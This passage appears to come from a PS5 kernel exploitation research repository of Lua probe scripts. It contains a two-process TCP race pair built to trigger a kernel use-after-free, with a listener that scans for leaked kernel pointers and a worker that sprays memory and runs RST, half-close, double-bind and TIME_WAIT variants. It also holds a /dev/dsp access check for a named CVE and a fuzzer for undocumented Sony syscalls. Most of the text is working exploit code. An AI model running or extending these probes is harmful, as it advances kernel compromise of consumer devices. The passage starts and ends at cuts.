print("=== J: SUMMARY ===")
print("pid: " .. pid)
print("modules: " .. #modules)
print("")
print("=== PROBE 52a COMPLETE ===")
```

## probes/phase10_untested_theories/52b_race_setup.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 52b-setup: Multi-process TCP race condition — listener/acceptor
--
-- THEORY: Two separate loader processes (two TCP connections to 9026) can
-- race on shared kernel TCP state. Process A (this script) listens on a
-- port. Process B (52b_race_worker.lua) rapidly connects and RST-closes.
-- The race window is between accept() returning a fd and the kernel
-- processing the RST that destroys the underlying TCB.
--
-- LAUNCH ORDER: Send this script FIRST, wait 2 seconds, then send
-- 52b_race_worker.lua on a SECOND TCP connection.
--
-- FreeBSD r230171 (2012) had known races in tcp_close/in_pcbfree/sofree.
-- The PS5's kernel may still have these if Sony didn't backport fixes.

print("=== PROBE 52b-SETUP: TCP RACE LISTENER ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Syscall wrappers
local sc_getpid = make_syscall(20)
local sc_socket = make_syscall(97)
local sc_bind = make_syscall(104)
local sc_listen = make_syscall(106)
local sc_accept = make_syscall(30)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_getsockopt = make_syscall(118)
local sc_read = make_syscall(3)
local sc_write = make_syscall(4)
local sc_poll = make_syscall(209)
local sc_getsockname = make_syscall(32)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("PID: " .. pid)

-- Constants
local AF_INET = 2
local SOCK_STREAM = 1
local SOL_SOCKET = 0xFFFF
local SO_REUSEADDR = 0x0004
local SO_REUSEPORT = 0x0200
local SO_ERROR = 0x1007
local SO_TYPE = 0x1008
local TCP_INFO_OPT = 32
local IPPROTO_TCP = 6
local LISTEN_PORT = 31337
local INADDR_LOOPBACK = 0x0100007F  -- 127.0.0.1 in network byte order

-- Build sockaddr_in
local function build_sockaddr_in(port, addr_nbo)
    local sa = memory.alloc(16)
    -- sin_len=16, sin_family=AF_INET
    safe_wd(sa, 0x00020010)
    -- sin_port (network byte order) + sin_addr
    local port_nbo = bit32.bor(bit32.lshift(bit32.band(port, 0xFF), 8),
                               bit32.rshift(bit32.band(port, 0xFF00), 8))
    safe_wd(sa + 4, bit32.bor(bit32.lshift(addr_nbo, 16), port_nbo))
    -- Actually: offset 2 = port (2 bytes, NBO), offset 4 = addr (4 bytes, NBO)
    -- Let's be precise:
    safe_wd(sa, 0)
    memory.write_byte(sa, 16)       -- sin_len
    memory.write_byte(sa + 1, AF_INET) -- sin_family
    -- port in network byte order
    memory.write_byte(sa + 2, bit32.rshift(bit32.band(port, 0xFF00), 8))
    memory.write_byte(sa + 3, bit32.band(port, 0xFF))
    -- addr = 127.0.0.1 = 0x7F000001, NBO = 0x7F, 0x00, 0x00, 0x01
    memory.write_byte(sa + 4, 0x7F)
    memory.write_byte(sa + 5, 0x00)
    memory.write_byte(sa + 6, 0x00)
    memory.write_byte(sa + 7, 0x01)
    return sa
end

-- Helper: write an int to a buffer (for setsockopt val)
local function make_int_buf(val)
    local buf = memory.alloc(4)
    safe_wd(buf, val)
    return buf
end

print("[1] Creating listener socket...")
local listen_fd = -1
pcall(function()
    listen_fd = to_num(sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0)))
end)
print("  listen_fd = " .. listen_fd)
if listen_fd < 0 then
    print("FATAL: socket() failed")
    return
end

-- Set SO_REUSEADDR and SO_REUSEPORT for aggressive port recycling
print("[2] Setting socket options...")
local opt_buf = make_int_buf(1)
pcall(function()
    sc_setsockopt(uint64(listen_fd), uint64(SOL_SOCKET), uint64(SO_REUSEADDR),
        uint64(opt_buf), uint64(4))
end)
pcall(function()
    sc_setsockopt(uint64(listen_fd), uint64(SOL_SOCKET), uint64(SO_REUSEPORT),
        uint64(opt_buf), uint64(4))
end)
print("  SO_REUSEADDR + SO_REUSEPORT set")

print("[3] Binding to 127.0.0.1:" .. LISTEN_PORT .. "...")
local sa = build_sockaddr_in(LISTEN_PORT, INADDR_LOOPBACK)
local bind_ret = -999
pcall(function()
    bind_ret = to_num(sc_bind(uint64(listen_fd), uint64(sa), uint64(16)))
end)
print("  bind ret = " .. bind_ret)
if bind_ret ~= 0 then
    print("FATAL: bind() failed — trying port 31338")
    sa = build_sockaddr_in(31338, INADDR_LOOPBACK)
    pcall(function()
        bind_ret = to_num(sc_bind(uint64(listen_fd), uint64(sa), uint64(16)))
    end)
    print("  bind 31338 ret = " .. bind_ret)
    if bind_ret ~= 0 then
        print("FATAL: both ports failed")
        return
    end
    LISTEN_PORT = 31338
end

print("[4] Listening (backlog=128)...")
local listen_ret = -999
pcall(function()
    listen_ret = to_num(sc_listen(uint64(listen_fd), uint64(128)))
end)
print("  listen ret = " .. listen_ret)
if listen_ret ~= 0 then
    print("FATAL: listen() failed")
    return
end

print("")
print("=== LISTENER READY on 127.0.0.1:" .. LISTEN_PORT .. " ===")
print("=== Send 52b_race_worker.lua on another connection NOW ===")
print("")

-- Accept loop: accept connections as fast as possible, probe each for anomalies
local accept_count = 0
local anomaly_count = 0
local error_count = 0
local crash_count = 0

-- Allocate reusable buffers for getsockopt probing
local optval_buf = memory.alloc(256)
local optlen_buf = memory.alloc(4)
local peer_sa = memory.alloc(128)
local peer_len_buf = memory.alloc(4)

-- TCP_INFO buffer for deep inspection
local tcpinfo_buf = memory.alloc(256)
local tcpinfo_len = memory.alloc(4)

print("[5] Entering accept loop (500 iterations, ~15 seconds)...")
print("")

local start_iter = 0
local TOTAL_ITERS = 500

for i = 1, TOTAL_ITERS do
    -- Poll for readability first (with 100ms timeout to avoid blocking forever)
    local pollfd = memory.alloc(8)
    safe_wd(pollfd, listen_fd)       -- fd
    safe_wd(pollfd + 4, 0x0001)      -- events = POLLIN
    local poll_ret = -999
    pcall(function()
        poll_ret = to_num(sc_poll(uint64(pollfd), uint64(1), uint64(100)))
    end)

    if poll_ret <= 0 then
        -- No connection ready, keep looping
        if i % 100 == 0 then
            print("  [iter " .. i .. "] waiting for connections... (accepted=" .. accept_count .. ")")
        end
    else
        -- Accept the connection
        safe_wd(peer_len_buf, 128)
        local acc_fd = -1
        local acc_ok = pcall(function()
            acc_fd = to_num(sc_accept(uint64(listen_fd), uint64(peer_sa), uint64(peer_len_buf)))
        end)

        if not acc_ok or acc_fd < 0 then
            error_count = error_count + 1
            if error_count <= 5 then
                print("  [iter " .. i .. "] accept FAILED: fd=" .. acc_fd .. " ok=" .. tostring(acc_ok))
            end
        else
            accept_count = accept_count + 1

            -- === RACE WINDOW PROBING ===
            -- The worker is closing its end simultaneously. The kernel may be
            -- tearing down the TCB right now. Probe the accepted socket for
            -- signs of use-after-free or corrupted state.

            -- Probe 1: SO_ERROR — should be 0 for healthy socket, nonzero = anomaly
            safe_wd(optlen_buf, 4)
            safe_wd(optval_buf, 0xDEAD)
            local so_err = -999
            local p1_ok = pcall(function()
                sc_getsockopt(uint64(acc_fd), uint64(SOL_SOCKET), uint64(SO_ERROR),
                    uint64(optval_buf), uint64(optlen_buf))
                so_err = safe_rd(optval_buf) or -999
            end)

            -- Probe 2: TCP_INFO — 236 bytes of TCP state. Look for corrupted values.
            safe_wd(tcpinfo_len, 236)
            for j = 0, 232, 4 do safe_wd(tcpinfo_buf + j, 0) end
            local ti_ok = pcall(function()
                sc_getsockopt(uint64(acc_fd), uint64(IPPROTO_TCP), uint64(TCP_INFO_OPT),
                    uint64(tcpinfo_buf), uint64(tcpinfo_len))
            end)
            local ti_state = safe_rd(tcpinfo_buf) or -1      -- tcpi_state at offset 0
            local ti_rto = safe_rd(tcpinfo_buf + 8) or 0     -- tcpi_rto
            local ti_snd_mss = safe_rd(tcpinfo_buf + 16) or 0

            -- Probe 3: Read 1 byte — may hit freed buffer
            local read_buf = memory.alloc(4)
            safe_wd(read_buf, 0x41414141)
            local read_ret = -999
            local r_ok = pcall(function()
                read_ret = to_num(sc_read(uint64(acc_fd), uint64(read_buf), uint64(1)))
            end)

            -- Probe 4: getsockname on accepted fd — check for corrupted addresses
            safe_wd(peer_len_buf, 128)
            for j = 0, 124, 4 do safe_wd(peer_sa + j, 0) end
            local gsn_ok = pcall(function()
                sc_getsockname(uint64(acc_fd), uint64(peer_sa), uint64(peer_len_buf))
            end)
            local gsn_family = 0
            if gsn_ok then
                gsn_family = safe_rd(peer_sa) or 0
                gsn_family = bit32.band(bit32.rshift(gsn_family, 8), 0xFF)
            end

            -- Check for anomalies
            local anomaly = false
            local anomaly_desc = ""

            if so_err ~= 0 and so_err ~= 104 and so_err ~= 54 then
                -- 104=ECONNRESET, 54=ECONNRESET (different constant?)
                -- Anything else is suspicious
                anomaly = true
                anomaly_desc = anomaly_desc .. "SO_ERROR=" .. so_err .. " "
            end

            if ti_state ~= nil and ti_state > 11 and ti_state ~= 0 then
                -- TCP states are 0-11. >11 means corruption
                anomaly = true
                anomaly_desc = anomaly_desc .. "TCP_STATE=" .. ti_state .. " "
            end

            if ti_rto > 0x10000000 then
                -- RTO > 268 seconds is suspicious (freed memory pattern?)
                anomaly = true
                anomaly_desc = anomaly_desc .. "RTO=0x" .. string.format("%X", ti_rto) .. " "
            end

            if gsn_ok and gsn_family ~= AF_INET and gsn_family ~= 0 then
                anomaly = true
                anomaly_desc = anomaly_desc .. "FAMILY=" .. gsn_family .. " "
            end

            if not p1_ok then
                anomaly = true
                anomaly_desc = anomaly_desc .. "GETSOCKOPT_CRASH "
            end

            if not r_ok then
                crash_count = crash_count + 1
                anomaly = true
                anomaly_desc = anomaly_desc .. "READ_CRASH "
            end

            -- Scan TCP_INFO for kernel pointers (UAF could expose them)
            if ti_ok then
                for off = 0, 232, 8 do
                    local q = safe_rq(tcpinfo_buf + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            anomaly = true
                            anomaly_desc = anomaly_desc .. string.format(
                                "KPTR@+%d=0x%X%08X ", off, h, l)
                        end
                    end
                end
            end

            if anomaly then
                anomaly_count = anomaly_count + 1
                print(string.format("  *** ANOMALY #%d [iter %d] fd=%d: %s",
                    anomaly_count, i, acc_fd, anomaly_desc))
            end

            -- Log every 50th connection for progress
            if accept_count % 50 == 0 then
                print(string.format("  [iter %d] accepted=%d anomalies=%d errors=%d state=%d so_err=%d",
                    i, accept_count, anomaly_count, error_count,
                    ti_state or -1, so_err))
            end

            -- Close the accepted fd
            pcall(function() sc_close(uint64(acc_fd)) end)
        end
    end
end

-- Clean up
pcall(function() sc_close(uint64(listen_fd)) end)

print("")
print("=== RACE SETUP RESULTS ===")
print("Total iterations: " .. TOTAL_ITERS)
print("Accepted connections: " .. accept_count)
print("Anomalies detected: " .. anomaly_count)
print("Accept errors: " .. error_count)
print("Read crashes: " .. crash_count)
print("")
if anomaly_count > 0 then
    print("*** ANOMALIES FOUND — review output above for kernel pointer leaks or state corruption ***")
else
    print("No anomalies detected in this run. Race window may need tighter timing.")
    print("Consider: reduce poll timeout, add more iterations, or try SO_LINGER variant.")
end
print("")
print("=== PROBE 52b-SETUP COMPLETE ===")
```

## probes/phase10_untested_theories/52b_race_worker.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 52b-worker: Multi-process TCP race condition — connector/RST sender
--
-- THEORY: Race the kernel's TCP connection teardown against the listener's
-- accept(). This script rapidly connects to the listener (52b_race_setup.lua)
-- and immediately closes with SO_LINGER(0) to send RST instead of FIN.
-- The RST triggers immediate TCB destruction in the kernel. If accept()
-- on the other process returns a fd to the TCB after the RST is processed,
-- we get a use-after-free.
--
-- LAUNCH ORDER: Send 52b_race_setup.lua FIRST on one TCP connection,
-- wait 2 seconds, then send this script on a SECOND TCP connection.
--
-- VARIANT ATTACKS:
--  A) SO_LINGER(0) close → RST (fastest teardown)
--  B) Half-close via shutdown(SHUT_WR) + close (exercises FIN_WAIT/CLOSE_WAIT)
--  C) Write data then RST (exercises receive buffer + teardown race)
--  D) Connect + immediate rebind to same port (TIME_WAIT assassination)

print("=== PROBE 52b-WORKER: TCP RACE CONNECTOR ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Syscall wrappers
local sc_getpid = make_syscall(20)
local sc_socket = make_syscall(97)
local sc_connect = make_syscall(98)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_write = make_syscall(4)
local sc_shutdown = make_syscall(134)
local sc_bind = make_syscall(104)
local sc_getsockopt = make_syscall(118)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("PID: " .. pid)

-- Constants
local AF_INET = 2
local SOCK_STREAM = 1
local SOL_SOCKET = 0xFFFF
local SO_LINGER = 0x0080
local SO_REUSEADDR = 0x0004
local SO_REUSEPORT = 0x0200
local SO_ERROR = 0x1007
local SHUT_WR = 1
local SHUT_RDWR = 2
local LISTEN_PORT = 31337

-- Build sockaddr_in for 127.0.0.1:<port>
local function build_sockaddr_in(port)
    local sa = memory.alloc(16)
    safe_wd(sa, 0)
    memory.write_byte(sa, 16)           -- sin_len
    memory.write_byte(sa + 1, AF_INET)  -- sin_family
    memory.write_byte(sa + 2, bit32.rshift(bit32.band(port, 0xFF00), 8))
    memory.write_byte(sa + 3, bit32.band(port, 0xFF))
    memory.write_byte(sa + 4, 0x7F)     -- 127.0.0.1
    memory.write_byte(sa + 5, 0x00)
    memory.write_byte(sa + 6, 0x00)
    memory.write_byte(sa + 7, 0x01)
    return sa
end

local target_sa = build_sockaddr_in(LISTEN_PORT)

-- Spray buffer: random-looking data to fill freed TCB memory
local spray_buf = memory.alloc(256)
for i = 0, 252, 4 do
    safe_wd(spray_buf + i, 0x41424344 + i)
end

-- Linger struct: l_onoff=1, l_linger=0 → RST on close
local linger_buf = memory.alloc(8)
safe_wd(linger_buf, 1)        -- l_onoff = 1
safe_wd(linger_buf + 4, 0)    -- l_linger = 0 seconds

local connect_count = 0
local connect_fail = 0
local rst_count = 0
local halfclose_count = 0
local dataclose_count = 0

print("[1] Starting rapid connect/RST loop to 127.0.0.1:" .. LISTEN_PORT)
print("    Variant A: SO_LINGER(0) RST close")
print("    Variant B: shutdown(SHUT_WR) half-close")
print("    Variant C: Write data + RST")
print("")

local TOTAL_ITERS = 500

for i = 1, TOTAL_ITERS do
    -- Create socket
    local fd = -1
    local sok = pcall(function()
        fd = to_num(sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0)))
    end)
    if not sok or fd < 0 then
        connect_fail = connect_fail + 1
        if connect_fail <= 3 then
            print("  [iter " .. i .. "] socket() failed: fd=" .. fd)
        end
    else
        -- Set SO_REUSEADDR for aggressive port recycling
        local opt1 = memory.alloc(4)
        safe_wd(opt1, 1)
        pcall(function()
            sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_REUSEADDR),
                uint64(opt1), uint64(4))
        end)

        -- Connect to listener
        local conn_ret = -999
        local cok = pcall(function()
            conn_ret = to_num(sc_connect(uint64(fd), uint64(target_sa), uint64(16)))
        end)

        if not cok or conn_ret ~= 0 then
            connect_fail = connect_fail + 1
            if connect_fail <= 5 then
                print("  [iter " .. i .. "] connect failed: ret=" .. conn_ret)
            end
            pcall(function() sc_close(uint64(fd)) end)
        else
            connect_count = connect_count + 1

            -- Pick a variant based on iteration to exercise different kernel paths
            local variant = (i % 3)

            if variant == 0 then
                -- VARIANT A: SO_LINGER(0) + close = immediate RST
                -- This is the fastest teardown — best race window
                pcall(function()
                    sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_LINGER),
                        uint64(linger_buf), uint64(8))
                end)
                pcall(function() sc_close(uint64(fd)) end)
                rst_count = rst_count + 1

            elseif variant == 1 then
                -- VARIANT B: shutdown(SHUT_WR) then close
                -- Exercises FIN_WAIT states — different kernel code path
                pcall(function()
                    sc_shutdown(uint64(fd), uint64(SHUT_WR))
                end)
                -- Small delay would help but we can't sleep; just close
                pcall(function() sc_close(uint64(fd)) end)
                halfclose_count = halfclose_count + 1

            else
                -- VARIANT C: Write data then RST-close
                -- Kernel must handle data in the send buffer during RST
                -- This exercises soreceive/sosend + teardown interaction
                pcall(function()
                    sc_write(uint64(fd), uint64(spray_buf), uint64(128))
                end)
                pcall(function()
                    sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_LINGER),
                        uint64(linger_buf), uint64(8))
                end)
                pcall(function() sc_close(uint64(fd)) end)
                dataclose_count = dataclose_count + 1
            end
        end
    end

    -- Progress every 100 iterations
    if i % 100 == 0 then
        print(string.format("  [iter %d] connected=%d failed=%d (RST=%d half=%d data=%d)",
            i, connect_count, connect_fail, rst_count, halfclose_count, dataclose_count))
    end
end

print("")
print("=== VARIANT D: SO_REUSEPORT double-bind race ===")
print("[2] Attempting simultaneous bind to same port as listener...")

-- Try to bind our own socket to the listener's port while it's active.
-- With SO_REUSEPORT, FreeBSD allows this. The kernel's bind path
-- walks the PCB hash and may race with the listener's accept loop.
local dbl_bind_count = 0
local dbl_bind_ok = 0

for i = 1, 50 do
    local fd = -1
    pcall(function()
        fd = to_num(sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0)))
    end)
    if fd >= 0 then
        local opt1 = memory.alloc(4)
        safe_wd(opt1, 1)
        pcall(function()
            sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_REUSEADDR),
                uint64(opt1), uint64(4))
        end)
        pcall(function()
            sc_setsockopt(uint64(fd), uint64(SOL_SOCKET), uint64(SO_REUSEPORT),
                uint64(opt1), uint64(4))
        end)

        local bind_sa = build_sockaddr_in(LISTEN_PORT)
        local br = -999
        pcall(function()
            br = to_num(sc_bind(uint64(fd), uint64(bind_sa), uint64(16)))
        end)
        dbl_bind_count = dbl_bind_count + 1
        if br == 0 then
            dbl_bind_ok = dbl_bind_ok + 1
            -- If bind succeeded, we now have TWO processes bound to same port!
            -- Try to listen and see what happens
            local lr = -999
            pcall(function()
                lr = to_num(sc_listen(uint64(fd), uint64(1)))
            end)
            if lr == 0 then
                print(string.format("  *** DOUBLE LISTEN on port %d! listen ret=%d", LISTEN_PORT, lr))
            end
        end
        pcall(function() sc_close(uint64(fd)) end)
    end
end

print(string.format("  Double-bind attempts: %d, succeeded: %d", dbl_bind_count, dbl_bind_ok))

-- === VARIANT E: TIME_WAIT port assassination ===
print("")
print("=== VARIANT E: TIME_WAIT state race ===")
print("[3] Rapid connect/close to create TIME_WAIT pile-up...")

-- Connect and close normally (FIN, not RST) to leave connections in TIME_WAIT.
-- Then try to rebind the source ports while TIME_WAIT entries exist.
local tw_count = 0
for i = 1, 100 do
    local fd = -1
    pcall(function()
        fd = to_num(sc_socket(uint64(AF_INET), uint64(SOCK_STREAM), uint64(0)))
    end)
    if fd >= 0 then
        local cr = -999
        pcall(function()
            cr = to_num(sc_connect(uint64(fd), uint64(target_sa), uint64(16)))
        end)
        if cr == 0 then
            -- Normal close (FIN) to create TIME_WAIT on listener side
            pcall(function() sc_close(uint64(fd)) end)
            tw_count = tw_count + 1
        else
            pcall(function() sc_close(uint64(fd)) end)
        end
    end
end
print(string.format("  TIME_WAIT connections created: %d", tw_count))

print("")
print("=== RACE WORKER RESULTS ===")
print("Total connection attempts: " .. (connect_count + connect_fail))
print("Successful connections: " .. connect_count)
print("Connection failures: " .. connect_fail)
print("  RST closes (variant A): " .. rst_count)
print("  Half-closes (variant B): " .. halfclose_count)
print("  Data+RST (variant C): " .. dataclose_count)
print("Double-bind successes: " .. dbl_bind_ok .. "/" .. dbl_bind_count)
print("TIME_WAIT pile-ups: " .. tw_count)
print("")
if connect_fail > connect_count then
    print("NOTE: High failure rate. Listener may have crashed (race success?)")
    print("      or port " .. LISTEN_PORT .. " is not reachable.")
    print("      Check 52b_race_setup output for anomalies/crashes.")
elseif dbl_bind_ok > 0 then
    print("*** DOUBLE-BIND SUCCEEDED — two processes on same port! ***")
    print("    This is a potential entry to PCB confusion attacks.")
end
print("")
print("=== PROBE 52b-WORKER COMPLETE ===")
```

## probes/phase10_untested_theories/54a_dsp_access_check.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 54a: /dev/dsp availability check for CVE-2026-45258
--
-- This is an access-only check. It performs open(O_RDONLY) and closes any
-- returned descriptor. It does not issue ioctl(), mmap(), or overflow inputs.

print("=== PROBE 54a: /dev/dsp ACCESS CHECK ===")
print("scope: open/close only; no mmap or ioctl")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

-- /dev/null is a positive control for syscall 5 and this loader path.
local paths = {"/dev/null", "/dev/dsp", "/dev/dsp0.0", "/dev/sndstat"}
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or -1
end

for _, path in ipairs(paths) do
    local buf = memory.alloc(#path + 1)
    for i = 1, #path do memory.write_byte(buf + i - 1, string.byte(path, i)) end
    memory.write_byte(buf + #path, 0)

    local ok, fd = pcall(function() return sc_open(buf, 0, 0) end)
    if not ok then
        print(path .. ": OPEN_ERROR " .. tostring(fd))
    else
        local n = to_num(fd)
        if n >= 0 then
            print(path .. ": OPEN_OK fd=" .. tostring(n) .. " (closing immediately)")
            local close_ok, close_ret = pcall(function() return sc_close(fd) end)
            print(path .. ": CLOSE_" .. (close_ok and "RESULT " .. tostring(close_ret) or "ERROR " .. tostring(close_ret)))
        else
            print(path .. ": OPEN_DENIED_OR_ABSENT ret=" .. tostring(fd))
        end
    end
end

print("RESULT_LIMIT: accessibility only; CVE trigger and patch state not tested")
print("=== PROBE 54a COMPLETE ===")
```

```lua
-- CRASH_CLASS: LOW
-- PROBE 46a: Sony Syscall 557/620 Deep Investigation
--
-- Context: Phase 10 sweep (probe 43g) found syscall 557 returns 16901 and
-- syscall 620 returns 0 when called with zero args. Both are live Sony-specific
-- syscalls. 557's non-trivial return (0x4205) suggests it may be a query
-- function that returns data or a handle. We need to identify what these
-- do and whether they leak kernel pointers in output buffers.
--
-- On PS4, known Sony syscalls in this range include get_proc_type_info,
-- get_authinfo, budget ops, and others that sometimes expose internal state.

print("=== PROBE 46a: SONY SYSCALL 557/620 DEEP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

local function hexdump(addr, len, label)
    print(label .. ":")
    for row = 0, len - 1, 16 do
        local hex = ""
        for col = 0, 15 do
            if row + col < len then
                local ok_b, b = pcall(function()
                    return memory.read_byte(addr + row + col)
                end)
                if ok_b then
                    hex = hex .. string.format("%02x ", to_num(b))
                else
                    hex = hex .. "?? "
                end
            end
        end
        print(string.format("  +%03x: %s", row, hex))
    end
end

local function scan_kptrs(addr, len, label)
    local found = 0
    for off = 0, len - 8, 8 do
        local val = safe_rq(addr + off)
        if val then
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                print(string.format("  *** KERNEL PTR at +%03x: %08X_%08X", off, h, l))
                found = found + 1
            end
        end
    end
    if found == 0 then
        print("  " .. label .. ": no kernel pointers")
    end
    return found
end

local function fill_dead(addr, len)
    for i = 0, len - 1, 4 do safe_wd(addr + i, 0xDEADDEAD) end
end

local function check_modified(addr, len, expected)
    if expected == nil then expected = 0xDEADDEAD end
    for i = 0, len - 1, 4 do
        local v = safe_rd(addr + i)
        if v and v ~= expected then return true end
    end
    return false
end

-- ============================================
-- SECTION A: Syscall 557 — argument sweep
-- ============================================
print("")
print("=== A: SYSCALL 557 ARG SWEEP ===")

local sc557 = make_syscall(557)

local ok, ret = pcall(function() return sc557(uint64(0)) end)
print("557(0): ok=" .. tostring(ok) .. " ret=" .. (ok and tostring(to_num(ret)) or tostring(ret)))

local ok2, ret2 = pcall(function() return sc557(uint64(0)) end)
print("557(0) again: ret=" .. (ok2 and tostring(to_num(ret2)) or "-999"))

for _, arg in ipairs({1, 2, pid, 0x100, 0x1000, 0xFFFF, 0x10000, 0xFFFFFFFF}) do
    local ok_a, rv = pcall(function() return sc557(uint64(arg)) end)
    print(string.format("557(0x%X): ret=%s", arg, ok_a and tostring(to_num(rv)) or "CRASH"))
end

-- Multi-arg patterns
for _, args in ipairs({
    {0, 0},
    {1, 0},
    {0, 1},
    {pid, 0},
    {0, pid},
    {1, 1},
    {0, 0, 0},
    {pid, 0, 0},
    {0, 0, 0, 0},
}) do
    local a1 = uint64(args[1])
    local a2 = args[2] and uint64(args[2]) or nil
    local a3 = args[3] and uint64(args[3]) or nil
    local a4 = args[4] and uint64(args[4]) or nil
    local tag = "557("
    for i, v in ipairs(args) do
        if i > 1 then tag = tag .. "," end
        tag = tag .. tostring(v)
    end
    tag = tag .. ")"
    local ok_m, rv_m
    if a4 then
        ok_m, rv_m = pcall(function() return sc557(a1, a2, a3, a4) end)
    elseif a3 then
        ok_m, rv_m = pcall(function() return sc557(a1, a2, a3) end)
    elseif a2 then
        ok_m, rv_m = pcall(function() return sc557(a1, a2) end)
    else
        ok_m, rv_m = pcall(function() return sc557(a1) end)
    end
    print(tag .. ": ret=" .. (ok_m and tostring(to_num(rv_m)) or "CRASH"))
end

-- ============================================
-- SECTION B: Syscall 557 — output buffer tests
-- ============================================
print("")
print("=== B: 557 OUTPUT BUFFER TESTS ===")

local buf = memory.alloc(0x400)

-- Pattern 1: buf as arg1
fill_dead(buf, 0x400)
ok, ret = pcall(function() return sc557(uint64(buf)) end)
print("557(buf): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
if check_modified(buf, 0x100) then
    print("*** BUFFER MODIFIED (arg1=buf)! ***")
    hexdump(buf, 128, "  first 128B")
    scan_kptrs(buf, 0x400, "557(buf)")
end

-- Pattern 2: buf, size
fill_dead(buf, 0x400)
ok, ret = pcall(function() return sc557(uint64(buf), uint64(0x400)) end)
print("557(buf, 0x400): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
if check_modified(buf, 0x100) then
    print("*** BUFFER MODIFIED (buf,size)! ***")
    hexdump(buf, 128, "  first 128B")
    scan_kptrs(buf, 0x400, "557(buf,0x400)")
end

-- Pattern 3: pid, buf
fill_dead(buf, 0x400)
ok, ret = pcall(function() return sc557(uint64(pid), uint64(buf)) end)
print("557(pid, buf): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
if check_modified(buf, 0x100) then
    print("*** BUFFER MODIFIED (pid,buf)! ***")
    hexdump(buf, 128, "  first 128B")
    scan_kptrs(buf, 0x400, "557(pid,buf)")
end

-- Pattern 4: pid, buf, size
fill_dead(buf, 0x400)
ok, ret = pcall(function() return sc557(uint64(pid), uint64(buf), uint64(0x400)) end)
print("557(pid, buf, 0x400): ret=" .. (ok and tostring(to_num(ret)) or "CRASH"))
if check_modified(buf, 0x100) then
    print("*** BUFFER MODIFIED (pid,buf,size)! ***")
    hexdump(buf, 128, "  first 128B")
    scan_kptrs(buf, 0x400, "557(pid,buf,0x400)")
end

-- Pattern 5: buf, &sizep (sysctl-style)
local sizep = memory.alloc(8)
fill_dead(buf, 0x400)
safe_wd(sizep, 0x400)
safe_wd(sizep + 4, 0)
ok, ret = pcall(function() return sc557(uint64(buf), uint64(sizep)) end)
local new_sz = safe_rd(sizep)
print("557(buf, &size): ret=" .. (ok and tostring(to_num(ret)) or "CRASH") ..
      " size_after=" .. (new_sz or "nil"))
if check_modified(buf, 0x100) then

    hexdump(buf, 128, "  first 128B")
    scan_kptrs(buf, 0x400, "557(buf,&sizep)")
end

-- Pattern 6: pid, buf, &sizep
